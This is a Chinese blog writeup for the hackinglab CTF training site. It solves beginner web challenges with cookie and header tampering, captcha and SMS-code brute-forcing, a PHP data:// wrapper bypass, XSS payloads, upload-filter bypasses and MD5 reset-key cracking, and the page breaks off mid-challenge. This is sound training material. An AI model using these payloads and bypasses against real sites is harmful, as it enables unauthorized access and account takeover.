<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
    
    <title>hackinglab网络安全实验室writeup | CherryGk&#39;s Blog | If you have any questions, please contact QQ1196821466 or leave message in the upper right.</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="/css/style.css?v=1.3.1">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	false,
            lv: JSON.parse('{"enable":true,"app_id":"BgxLbK8bfVBhr3OOhIdHmoKz-gzGzoHsz","app_key":"twfcGffxeJ6Bfm4fpJUQ256M","icon":true}'),
            v: JSON.parse('{"enable":true,"appid":"BgxLbK8bfVBhr3OOhIdHmoKz-gzGzoHsz","appkey":"twfcGffxeJ6Bfm4fpJUQ256M","notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":"c1ada43c"}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
        <script type="text/javascript" src="/js/plugins/daovoice.js?v=1.3.1"></script>
    
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname"></h5>
          <a href="mailto:1196821466@qq.com" title="1196821466@qq.com" class="mail">
            
              <span>1</span>
            
              <span>1</span>
            
              <span>9</span>
            
              <span>6</span>
            
              <span>8</span>
            
              <span>2</span>
            
              <span>1</span>
            
              <span>4</span>
            
              <span>6</span>
            
              <span>6</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                文章分类
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                标签
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                文章总览
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                关于
              </a>
            </li>
        
            <li class="">
              <a href="/links"  >
                <i class="icon icon-lg icon-plus-square"></i>
                友链
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>hackinglab网络安全实验室writeup</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">hackinglab网络安全实验室writeup</h1>
        <h5 class="subtitle">
            
                <time datetime="2018-07-13T10:15:59.000Z" itemprop="datePublished" class="page-time">
  2018-07-13
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-hackinglab"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">hackinglab网络安全实验室writeup</h1>
        <div class="post-meta">
            <time class="post-time" title="2018-07-13 18:15:59" datetime="2018-07-13T10:15:59.000Z"  itemprop="datePublished">2018-07-13</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>



            
	<span id="/2018/07/13/hackinglab/" class="leancloud_visitors" data-flag-title="hackinglab网络安全实验室writeup" title="hackinglab网络安全实验室writeup">
		
			<i class="icon icon-eye"></i>
		
		<span class="leancloud-visitors-count"></span>
	</span>
 

            
    <span class="leancloud-comment">
        <i class="icon icon-comment-o"></i>
        <a href="/2018/07/13/hackinglab/#comment">
            <span class="valine-comment-count" data-xid="/2018/07/13/hackinglab/"></span>
        </a>
    </span>



            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=1296583188&auto=1&height=32"></iframe></p>
<h3 id="基础关"><a href="#基础关" class="headerlink" title="基础关"></a>基础关</h3><h4 id="key在哪里"><a href="#key在哪里" class="headerlink" title="key在哪里?"></a>key在哪里?</h4><p>查看源代码，直接找到flag</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/9556473.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="再加密一次你就得到key啦"><a href="#再加密一次你就得到key啦" class="headerlink" title="再加密一次你就得到key啦~"></a>再加密一次你就得到key啦~</h4><p>给出的提示是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加密之后的数据为xrlvf23xfqwsxsqf</span><br></pre></td></tr></table></figure></p>
<p>凯撒加密<br>移了13位，<a href="http://ctf.ssleye.com/caesar.html" target="_blank" rel="noopener">在线加密</a>选择移位<code>13</code>即可得到<code>key</code></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/47606007.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="猜猜这是经过了多少次加密？"><a href="#猜猜这是经过了多少次加密？" class="headerlink" title="猜猜这是经过了多少次加密？"></a>猜猜这是经过了多少次加密？</h4><p>一看就是<code>base64</code>，一直base64解码即可拿到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/40593997.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="据说MD5加密很安全，真的是么？"><a href="#据说MD5加密很安全，真的是么？" class="headerlink" title="据说MD5加密很安全，真的是么？"></a>据说MD5加密很安全，真的是么？</h4><p><a href="http://www.somd5.com/" target="_blank" rel="noopener">md5解密</a></p>
<p>直接得到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/58077638.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="种族歧视"><a href="#种族歧视" class="headerlink" title="种族歧视"></a>种族歧视</h4><p>打开之后提示<code>only for Foreigner</code></p>
<p>拿bp抓个包，将<code>Accept-Language:</code>这一栏的内容删掉即可</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/77260861.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="HAHA浏览器"><a href="#HAHA浏览器" class="headerlink" title="HAHA浏览器"></a>HAHA浏览器</h4><p>Hint:<br>据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？<br>估计是改<code>user-agent</code><br>抓包,只要<code>user-agent</code>里出现<code>HAHA</code>即可得到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/25075365.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="key究竟在哪里呢？"><a href="#key究竟在哪里呢？" class="headerlink" title="key究竟在哪里呢？"></a>key究竟在哪里呢？</h4><p>访问后提示：Key就在这里，猜猜这里是哪里呢？(Web找key加强版)<br>抓个包，查看之后发现在响应头里：</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/44802568.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="key又找不到了"><a href="#key又找不到了" class="headerlink" title="key又找不到了"></a>key又找不到了</h4><p>照常抓包，发现一个<code>key_is_here_now_.php</code>,估计是个<code>302跳转</code>，用<code>bp</code>访问一下，即可得到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/52715712.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="冒充登陆用户"><a href="#冒充登陆用户" class="headerlink" title="冒充登陆用户"></a>冒充登陆用户</h4><p>访问后提示：<code>您还没有登陆呢！</code><br>抓包后发现<code>cookie</code>中有一个<code>login=0</code>的参数，改为<code>1</code>即可得到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/72734267.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h4><p>题目给了一个输入框，但是限制了长度，同样的，抓包，把<code>v</code>的值网大传，即可得到flag</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/62716700.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h4><p>题目坏了，但是这题的解题方法就是XFF，在发送包中添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure></p>
<p>即可得到key</p>
<h4 id="就不让你访问"><a href="#就不让你访问" class="headerlink" title="就不让你访问"></a>就不让你访问</h4><p>题目提示：小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs!</p>
<p>直接扫估计是不行的，试试<code>robots</code>，还真有<br>内容是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Crawl-delay: 120</span><br><span class="line">Disallow: /9fb97531fe95594603aff7e794ab2f5f/</span><br><span class="line">Sitemap: http://www.hackinglab.sinaapp.com/sitemap.xml</span><br></pre></td></tr></table></figure></p>
<p>访问<code>/9fb97531fe95594603aff7e794ab2f5f/</code>,提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you find me,but I am not the login page. keep search.</span><br></pre></td></tr></table></figure></p>
<p>提示在<code>login page</code>，直接访问<code>login.php</code>，得到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/89095162.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h3 id="脚本关"><a href="#脚本关" class="headerlink" title="脚本关"></a>脚本关</h3><h4 id="key又又找不到了"><a href="#key又又找不到了" class="headerlink" title="key又又找不到了"></a>key又又找不到了</h4><p>也是抓包，但是直接看到key了…不清楚原因</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/75077819.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="快速口算"><a href="#快速口算" class="headerlink" title="快速口算"></a>快速口算</h4><p>请在2秒内口算结果并提交！</p>
<p>在2s内算出来机会不大，所以需要写脚本了，附上py脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import re </span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()  </span><br><span class="line">url = &apos;http://1.hacklist.sinaapp.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&apos;</span><br><span class="line">r = s.get(url)</span><br><span class="line">num = re.findall(re.compile(r&apos;&lt;br/&gt;\s+(.*)=&lt;input&apos;), r.text)[0]  #正则匹配，可以先看看源代码</span><br><span class="line">r = s.post(url, data=&#123;&apos;v&apos;: eval(num)&#125;)  #计算表达式的值，并将结果提交  抓包可看出要用v提交</span><br><span class="line">print (r.text)  #输出结果</span><br></pre></td></tr></table></figure>
<p>运行后得到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/66300172.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="这个题目是空的"><a href="#这个题目是空的" class="headerlink" title="这个题目是空的"></a>这个题目是空的</h4><p>这题有点坑，答案就是<code>null</code>小写</p>
<h4 id="怎么就是不弹出key呢？"><a href="#怎么就是不弹出key呢？" class="headerlink" title="怎么就是不弹出key呢？"></a>怎么就是不弹出key呢？</h4><p>点了几次不行之后，看看源代码：</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/34069482.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>可以看到各种<code>return false</code>，但是既然是js的代码，我们就可以在本地搭建<br>将代码复制到本地，然后把前面三个<code>return false</code>的函数干掉</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/55634205.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>然后本地访问就行了</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/32380741.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>注意是从<code>chars</code>之后开始的14位</p>
<h4 id="逗比验证码第一期"><a href="#逗比验证码第一期" class="headerlink" title="逗比验证码第一期"></a>逗比验证码第一期</h4><p>这题的验证码验证一次之后不过期，所以。。<br>抓包爆破即可</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/87191568.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>爆破之后，密码是1238，拿到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/91760909.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="逗比验证码第二期"><a href="#逗比验证码第二期" class="headerlink" title="逗比验证码第二期"></a>逗比验证码第二期</h4><p>题目给提示，验证就失效，但是实际上验证一次之后验证码就不需要了，令值为空即可开始爆破。</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/65751756.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>爆破后得到密码1228，拿到key</p>
<h4 id="逗比的验证码第三期（SESSION）"><a href="#逗比的验证码第三期（SESSION）" class="headerlink" title="逗比的验证码第三期（SESSION）"></a>逗比的验证码第三期（SESSION）</h4><p>这题做法与上题一样，密码是1298，拿到key</p>
<h4 id="微笑一下就能过关了"><a href="#微笑一下就能过关了" class="headerlink" title="微笑一下就能过关了"></a>微笑一下就能过关了</h4><p><code>源代码</code>处点击可以看到源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    header(&quot;Content-type: text/html; charset=utf-8&quot;);</span><br><span class="line">    if (isset($_GET[&apos;view-source&apos;])) &#123; </span><br><span class="line">        show_source(__FILE__); </span><br><span class="line">        exit(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    include(&apos;flag.php&apos;); </span><br><span class="line"></span><br><span class="line">    $smile = 1;  </span><br><span class="line"></span><br><span class="line">   if (!isset ($_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/\./&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/%/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/[0-9]/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/http/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/https/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/ftp/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/telnet/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    if (preg_match (&apos;/_/&apos;, $_SERVER[&apos;QUERY_STRING&apos;])) $smile = 0; </span><br><span class="line">    if ($smile) &#123; </span><br><span class="line">        if (@file_exists ($_GET[&apos;^_^&apos;])) $smile = 0;  </span><br><span class="line">    &#125;  </span><br><span class="line">    if ($smile) &#123; </span><br><span class="line">        $smile = @file_get_contents ($_GET[&apos;^_^&apos;]);  </span><br><span class="line">        if ($smile === &quot;(●&apos;◡&apos;●)&quot;) die($flag);  </span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这题比较复杂，</p>
<p>首先<code>get</code>提交的参数中不能有特殊字符，数字<br>而且<code>http</code>、<code>https</code>、<code>ftp</code>等协议不能用，<br><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>中不能出现<code>_</code>字符，但是提交的变量却是<code>^_^</code><br>并且不能是文件,但是却有个<code>file_get_contents</code>函数，</p>
<p>绕过<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>很简单，因为<code>QUERY_STRING</code>会把<code>.</code>、<code>[</code>等符号解析成<code>_</code><br>，所以将提交的参数改为<code>^.^</code>、<code>^[^</code>等即可，<br>而绕过<code>file_exists</code>，就是用php的<code>data</code>伪协议，详情请点击<a href="https://cherrygk.github.io/2018/07/12/phpagree/" target="_blank" rel="noopener">php伪协议学习</a></p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[^=data://text/plain;charset=unicode,(●&apos;◡&apos;●)</span><br></pre></td></tr></table></figure></p>
<h4 id="逗比的手机验证码"><a href="#逗比的手机验证码" class="headerlink" title="逗比的手机验证码"></a>逗比的手机验证码</h4><p>这题不清楚为什么要出，没什么技术含量，<br>直接用13388886666手机号获取验证码，然后用13388886667<code>submit</code>就可以得到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/14383853.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="基情燃烧的岁月"><a href="#基情燃烧的岁月" class="headerlink" title="基情燃烧的岁月"></a>基情燃烧的岁月</h4><p>这题点击获取手机验证码之后提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">手机验证码是：验证码发到手机上了，你看不到..是3位纯数字，开头不为0</span><br></pre></td></tr></table></figure></p>
<p>看不到，估计是爆破了，但是在爆破之前需要点击一下获取验证码，不然会一直提示错误，<br>然后第一次爆破的结果是：</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/20411096.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>又得到一个手机号<code>13399999999</code>，同样的方法再爆破一次就能拿到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/62788792.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a>验证码识别</h4><p>这题前面的方法都不能用，只能老老实实的识别验证码了，因为全是数字，所以比较好识别，这里用的工具是<code>Pkav HTTP Fuzzer</code><br>使用方法：<br>将抓到的数据包内容复制粘贴进<code>请求包</code>处</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/74877318.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>下方的使用与bp差不多，手机验证码变量<code>添加标记</code>即可，验证码变量<code>添加验证码</code>即可，<br>然后将验证码图片的地址复制下来，工具底部有<code>图片型验证码</code>，将地址复制进去，<br>在头部请求加上自己的cookie,<br>在下方点击识别测试：</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/37045585.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>回到<code>变体设置</code>，设置自己payload，在重放设置栏选择数字自增长模式，</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/35105536.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>在<code>重放选项</code>处将线程设置为<code>单线程</code>，因为速度过快可能会报错<br>然后底下选择<code>发包器</code>,点击启动即可，一段时间后得到flag</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/1709369.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="XSS基础关"><a href="#XSS基础关" class="headerlink" title="XSS基础关"></a>XSS基础关</h4><p>XSS的题目在<code>Google浏览器</code>里做不了，所以只能在其他浏览器下做了，这里用的是<code>火狐浏览器</code><br>XSS可以先看看js的代码，在<code>http://lab1.xseclab.com/xssjs/xss_check.php</code>处可以看到给出key的代码，先试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(HackingLab)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>直接就success，得到了key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/67919307.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="XSS基础2-简单绕过"><a href="#XSS基础2-简单绕过" class="headerlink" title="XSS基础2:简单绕过"></a>XSS基础2:简单绕过</h4><p>这题用上题的payload的话会报错，多试几次发现是过滤了<code>&lt;script&gt;</code>，<br>用<code>&lt;img&gt;</code>就能绕过<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=haha onerror=alert(HackingLab)&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/52247146.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="XSS基础3-检测与构造"><a href="#XSS基础3-检测与构造" class="headerlink" title="XSS基础3:检测与构造"></a>XSS基础3:检测与构造</h4><p>这题输入的值会在下方的<code>input</code>框展示出来，<br>同样过滤了<code>&lt;script&gt;</code>、<code>javascript</code>、<code>&lt;img src&gt;</code> ，但是当查看源代码的时候可以发现，<br><code>&#39;</code>没有过滤，所以可以用一下<code>闭合</code>的思想，用bp抓包试验一下</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/63393393.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>输入<code>alert(HackingLab)</code>发现没有过滤<code>alert</code>，但是输入<code>onmouseover=alert(HackingLab)</code>，发现被检测到了，最终发现一个问题，当输入<code>alert</code>时，后面的添加的事件不会被过滤<br>构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert&apos;onmouseover=alert(HackingLab)&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后把鼠标移到第二个输入框即可弹窗，得到key:</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-14/48168602.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="Principle很重要的XSS"><a href="#Principle很重要的XSS" class="headerlink" title="Principle很重要的XSS"></a>Principle很重要的XSS</h4><p>这题跟上题类似，但是只是<code>input框</code>变成了<code>href</code>,我用上题的payload直接就得到key了。不清楚为什么给了这么多hint</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74204887.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>这些XSS的题目都可以用bp抓<code>响应包</code>来做，应该是后端没有做防护，这里就用最后一个题目做示范<br>首先抓到<code>请求包</code>，右键选择</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74603677.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>点击<code>Forward</code>，此时可以看到<code>响应包</code>也就是<code>response</code>包，<br>在下方输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=haha onerror=alert(HackingLab)&gt;</span><br></pre></td></tr></table></figure></p>
<p>再点击<code>Forward</code>，因为数据包有点多，所以一直点击<code>Forward</code>直到弹窗就行，弹窗之后还需要点击<code>Forward</code>得到后台给的key，同样能得到<code>key</code></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/10523935.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h3 id="注入关"><a href="#注入关" class="headerlink" title="注入关"></a>注入关</h3><p>注入关暂时做不了，题目服务器有问题</p>
<h3 id="上传关"><a href="#上传关" class="headerlink" title="上传关"></a>上传关</h3><h4 id="请上传一张jpg格式的图片1"><a href="#请上传一张jpg格式的图片1" class="headerlink" title="请上传一张jpg格式的图片1"></a>请上传一张jpg格式的图片1</h4><p>这题试了几次之后发现是前端验证,上传一个jpg，然后用bp抓包改一下即可拿到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74649040.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="请上传一张jpg格式的图片2"><a href="#请上传一张jpg格式的图片2" class="headerlink" title="请上传一张jpg格式的图片2"></a>请上传一张jpg格式的图片2</h4><p>跟第一题一样的做法。</p>
<h4 id="请上传一张jpg格式的图片3"><a href="#请上传一张jpg格式的图片3" class="headerlink" title="请上传一张jpg格式的图片3"></a>请上传一张jpg格式的图片3</h4><p>这题后端也做了验证，可以先用前面题目的方法试试，发现提交成功但是没有返回key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/56022428.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>试了试加一个.jpg</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/3655210.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>后端代码可能是验证文件名有没有<code>.jpg</code>，拿到key</p>
<h3 id="解密关"><a href="#解密关" class="headerlink" title="解密关"></a>解密关</h3><h4 id="以管理员身份登录系统"><a href="#以管理员身份登录系统" class="headerlink" title="以管理员身份登录系统"></a>以管理员身份登录系统</h4><p>打开题目发现这是一个标准的登录框，有<code>忘记密码</code>功能，并且题目提示重置管理员密码就能得到<code>key</code>，<br>先了解一下重置密码功能，在这个输入框中输入的值会被传到后端进行重置，<br>然后给出<code>重置密码链接</code>，但是<code>admin</code>用户重置之后没有提示,</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/83610629.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>所以我们照常在每个页面都抓包试一试，在这个页面可以看到<code>重置密码链接</code>提交的值中有两个参数，<br>一个是<code>sukey</code>，一个是<code>username</code></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/2536875.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>将<code>username</code>改为<code>admin</code>，发现什么都没有显示:</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/64114422.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>现在只能看另一个参数<code>sukey</code>了，长度看起来像<code>md5</code>，<a href="https://www.somd5.com/" target="_blank" rel="noopener">md5解密</a>试试：</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23208333.jpg" alt="" title="" class="">
                <p></p>
            </figure>
